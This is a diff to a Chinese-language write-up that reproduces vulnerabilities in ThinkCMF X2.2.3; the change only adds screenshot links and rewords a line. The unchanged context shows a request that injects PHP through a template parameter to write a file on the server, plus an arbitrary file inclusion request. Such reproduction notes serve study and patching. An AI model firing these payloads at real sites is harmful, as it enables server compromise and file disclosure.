@@ -30,13 +30,15 @@ ThinkCMF X2.2.3
 ?a=fetch&templateFile=public/index&prefix=''&content=<php>file_put_contents('test.php','<?php phpinfo(); ?>')</php>
 ```
 访问test.php，可以看到phpinfo已经加载出来
+![image](./0.png)
 
 任意文件包含漏洞复现：  
 浏览器访问  
 ```
 ?a=display&templateFile=README.md
 ```
-成功包含了README.md
+可以看到成功包含了README.md
+![image](./1.png)
 
 # 0x06 踩坑记录
 坑1：  
